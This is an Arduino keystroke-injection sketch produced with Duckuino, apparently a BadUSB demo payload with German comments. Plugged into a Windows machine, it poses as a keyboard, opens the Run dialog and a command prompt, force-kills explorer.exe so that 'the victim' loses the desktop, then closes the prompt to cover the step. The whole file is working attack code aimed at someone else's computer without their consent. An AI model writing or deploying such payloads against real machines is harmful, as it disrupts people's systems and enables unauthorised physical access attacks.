/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Payload 3
  // In Payload 3 will ich per cmd den Explorer beenden, dafür brauchen wir
  // keine erhöhten Rechte.
  // Delay 1000 als kleine Wartezeit, um sicherzugehen, das alles funktioniert
  // Jetzt müssen mit dem RUN Menü CMD öffnen
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("cmd"));

  delay(1000);
  typeKey(KEY_RETURN);

  delay(1000);
  // Jetzt fügen wir ein Befehl ein, der den Explorer schließt.
  // Somit sieht das Opfer ihren Desktop nicht mehr, bis der Explorer
  // wieder gestartet wird.
  Keyboard.print(F("taskkill /f /IM explorer.exe"));

  delay(200);
  typeKey(KEY_RETURN);

  delay(1000);
  // Jetzt schließen wir die Eingabeaufforderung
  Keyboard.print(F("taskkill /f /im cmd.exe"));

  delay(500);
  typeKey(KEY_RETURN);

  // Fertig!
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}